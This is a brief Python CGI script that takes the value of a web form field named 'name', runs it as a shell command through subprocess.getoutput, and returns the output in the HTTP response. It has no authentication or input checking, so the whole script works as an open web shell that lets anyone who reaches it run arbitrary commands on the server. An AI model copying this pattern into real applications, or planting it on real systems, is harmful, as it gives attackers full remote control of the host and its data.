#!/usr/bin/python3

print("content-type:text/html")
print()


import cgi
import subprocess

x=cgi.FieldStorage()
o=x.getvalue("name")


y=subprocess.getoutput(o)
print(y)


